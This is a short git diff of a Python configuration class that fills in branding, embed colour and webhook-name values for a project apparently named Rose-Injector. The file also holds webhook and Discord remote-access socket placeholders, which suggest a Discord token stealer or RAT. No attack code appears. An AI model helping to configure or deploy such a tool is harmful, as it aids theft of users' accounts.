@@ -3,12 +3,12 @@ from base64 import b64decode
 
 class Config:
     def __init__(self):
-        self.eb_color = 'EB_COLOR' # remove
-        self.eb_footer = 'EB_FOOTER' # remove 
-        self.debug_mode = 'DEBUG_MODE'
+        self.eb_color = 16711680 # remove
+        self.eb_footer = 'Rose-Injector | Made by Gumbobrot, ICExFS, suegdu | https://github.com/DamagingRose/Rose-Injector/' # remove 
+        self.debug_mode = False
         self.webhook = 'HOOK'
-        self.wh_avatar = 'WH_AVATAR' # remove 
-        self.wh_name = 'WH_NAME' # remove
+        self.wh_avatar = 'https://raw.githubusercontent.com/DamagingRose/Rose-Injector/main/tools/rose.png' # remove 
+        self.wh_name = 'Rose-Injector' # remove
         self.discord_rat = False
         self.discord_rat_socket_link = 'DISCORD_RAT_SOCKET_LINK'
         self.discord_ping = False
